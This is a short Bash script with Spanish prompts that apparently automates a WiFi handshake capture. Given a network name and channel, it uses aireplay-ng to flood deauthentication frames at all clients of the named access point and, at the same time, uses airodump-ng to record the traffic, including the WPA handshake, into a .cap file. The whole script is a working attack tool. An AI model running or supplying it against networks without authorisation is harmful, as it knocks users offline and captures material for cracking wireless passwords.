#!/bin/bash

trap ctrl_c INT
function ctrl_c(){
  kill -9 $aireplay_ng_xterm_PID 2>/dev/null
	echo -e "[*] Saliendo"
  mv *.cap "$apName".cap
  rm *.csv *.netxml
	exit 0
}

if [ "$(id -u)" == "0" ]; then
	declare -i parameter_counter=0;	while getopts ":a:c:" arg; do
		case $arg in
			a) apName=$OPTARG; let parameter_counter+=1;;
      c) apChanel=$OPTARG; let parameter_counter+=1;;
		esac
	done

  if [ $parameter_counter -ne 2 ]; then
		echo "Use: ./capture.sh -a [Network name] -c [Network chanel]"
	else
  xterm -hold -e "aireplay-ng -0 10 -c FF:FF:FF:FF:FF:FF -e '$apName' wlo1 && echo 'Done!'" &

  aireplay_ng_xterm_PID=$!
  airodump-ng -w Captura -c $apChanel --essid "$apName" wlo1
	fi

else
	echo -e "\n[*] No soy root\n"
fi
